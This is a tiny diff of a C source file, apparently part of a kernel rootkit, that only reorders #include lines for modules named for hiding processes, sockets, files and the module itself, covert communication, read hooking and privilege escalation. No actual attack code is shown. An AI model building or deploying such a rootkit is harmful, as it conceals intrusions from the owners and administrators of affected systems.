@@ -3,11 +3,11 @@
 
 #include "global.h"
 #include "hook_read.h"
+#include "covert_communication.h"
 #include "hide_module.h"
 #include "hide_processes.h"
 #include "hide_sockets.h"
 #include "hide_files.h"
-#include "covert_communication.h"
 #include "privilege_escalation.h"
 
 void init_commands(void) {
